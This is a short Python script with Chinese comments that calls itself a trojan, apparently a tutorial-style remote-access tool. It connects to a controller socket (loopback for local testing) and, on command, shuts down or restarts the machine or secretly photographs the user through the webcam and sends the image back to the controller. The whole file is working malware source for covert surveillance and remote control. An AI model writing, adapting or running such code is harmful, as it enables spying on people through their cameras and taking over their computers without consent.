from socket import*
import os  #导入操作系统模块
import cv2 #导入视觉图像处理模块
#1.准备一台电话机
s = socket()
#2.电话机申请连接后台号码
s.connect(('127.0.0.1', 8888))
#本机测试：木马 127.0.0.1  本机回环地址
choice = s.recv(1024).decode()
if choice == '1':
    os.system('shutdown -s -t 120')
elif choice == '2':
    os.system('shutdown -r -t 120')
elif choice == '3':
    #1.打开摄像头
    cap = cv2.VideoCapture(0)# 0默认摄像头 1另外一个
    #2.读取一帧图像(第一个一帧摄像头可能还在开启，所以读取两次一帧)
    ret, frame = cap.read()
    ret, frame = cap.read()
    #3.保存在电脑上
    cv2.imwrite('1.png', frame)
    #4.关闭摄像头
    cap.release()
    #5.把文件发送给后台
    #1.把文件大小计算出来 发送给后台 等待后头回复确认！
    file_size = os.path.getsize('1.png')
    s.send(str(file_size).encode())
    s.recv(1024).decode()

    #2.把文件打开 一点一点读取出来 发送过去
    with open('1.png', 'rb') as file:
        for data in file:
            s.send(data)